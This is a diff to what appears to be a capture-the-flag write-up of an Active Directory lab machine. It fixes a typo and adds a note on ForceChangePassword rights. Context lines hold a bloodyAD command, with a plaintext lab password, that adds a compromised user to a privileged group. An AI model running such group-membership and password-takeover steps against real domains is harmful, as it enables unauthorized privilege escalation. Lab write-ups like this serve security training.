@@ -390,10 +390,12 @@ This user has AddSelf to the chiefs marketing group
 bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u e.rodriguez -p 'Password123!' add groupMember 'CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB' 'e.rodriguez'
 ```
 
-This added the user to the groy
+This added the user to the group
 
 # Compromising `m.harris`
 
 ![](Pasted%20image%2020261004182114.png)
+
+This user has ForceChangePassword on the `m.harris` user
 
 
